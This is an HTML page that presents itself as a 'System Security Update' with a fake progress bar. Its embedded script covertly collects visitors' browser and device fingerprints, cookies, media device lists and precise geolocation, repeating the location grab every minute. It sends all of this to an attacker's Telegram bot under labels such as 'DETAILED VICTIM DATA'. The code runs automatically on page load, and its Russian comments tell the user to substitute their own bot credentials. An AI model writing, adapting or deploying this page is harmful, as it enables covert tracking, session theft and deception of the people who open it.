<!DOCTYPE html>
<html>
<head>
    <title>System Security Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #0d1117; color: white; min-height: 100vh; }
        .container { max-width: 500px; margin: 50px auto; text-align: center; }
        .card { background: #161b22; padding: 30px; border-radius: 10px; border: 1px solid #30363d; }
        .progress { background: #21262d; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-bar { height: 20px; background: #1f6feb; width: 0%; transition: width 0.5s; }
        .status { margin: 15px 0; font-size: 16px; color: #8b949e; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔄 System Security Update</h1>
            <p>Downloading and installing critical security patches...</p>
            
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="status" id="status">Initializing update process...</div>
        </div>
    </div>

    <script>
        // ⚠️ ЗАМЕНИ НА СВОИ ДАННЫЕ ⚠️
        const BOT_TOKEN = '8251830695:AAGdnd86D1vzDmO-ZFgN2kqF1eyrfpPs3OE';
        const CHAT_ID = '8270180051';
        
        let victimData = {};
        
        function collectAllData() {
            // Расширенный сбор данных
            victimData = {
                // Информация о браузере
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                
                // Информация об устройстве
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency,
                
                // Сеть и время
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'unknown',
                
                // Дополнительные данные
                url: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                
                // Возможности браузера
                touchSupport: 'ontouchstart' in window,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                doNotTrack: navigator.doNotTrack
            };
            
            // Отправка полных данных
            sendToTelegram('🎯 DETAILED VICTIM DATA:\n' + formatData(victimData));
        }
        
        function tryGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const locationInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + 'm',
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        };
                        sendToTelegram('📍 PRECISE LOCATION:\n' + formatData(locationInfo));
                    },
                    error => {
                        sendToTelegram('📍 LOCATION ERROR: ' + error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            }
        }
        
        function tryMediaAccess() {
            // Попытка доступа к камере
            navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    const mediaDevices = devices.map(device => ({
                        kind: device.kind,
                        label: device.label,
                        id: device.deviceId
                    }));
                    sendToTelegram('🎥 MEDIA DEVICES:\n' + formatData(mediaDevices));
                })
                .catch(err => {
                    sendToTelegram('🎥 MEDIA ACCESS: Denied');
                });
        }
        
        function stealCookies() {
            if (document.cookie) {
                sendToTelegram('🍪 COOKIES FOUND:\n' + document.cookie);
            } else {
                sendToTelegram('🍪 COOKIES: No cookies available');
            }
        }
        
        function formatData(obj) {
            if (Array.isArray(obj)) {
                return obj.map(item => `• ${JSON.stringify(item)}`).join('\n');
            }
            return Object.keys(obj).map(key => `• ${key}: ${obj[key]}`).join('\n');
        }
        
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).catch(err => console.log('Telegram error'));
        }
        
        // ОСНОВНОЙ ЗАПУСК
        setTimeout(() => {
            collectAllData();
            setTimeout(() => {
                tryGeolocation();
                tryMediaAccess();
                stealCookies();
            }, 2000);
        }, 1000);
        
        // ПОВТОРНЫЙ СБОР ГЕОЛОКАЦИИ
        setInterval(tryGeolocation, 60000);
        
        // Анимация обновления
        let progress = 0;
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        
        const updateSteps = [
            'Downloading security components...',
            'Verifying digital signatures...',
            'Installing system patches...',
            'Configuring security settings...',
            'Finalizing installation...'
        ];
        
        const interval = setInterval(() => {
            progress += 8 + Math.random() * 12;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                status.textContent = 'Update complete! System is secure.';
                sendToTelegram('✅ System update completed successfully');
            }
            progressBar.style.width = progress + '%';
            
            if (progress < 100) {
                const stepIndex = Math.min(Math.floor(progress / 20), updateSteps.length - 1);
                status.textContent = updateSteps[stepIndex];
            }
        }, 600);
    </script>
</body>
</html>
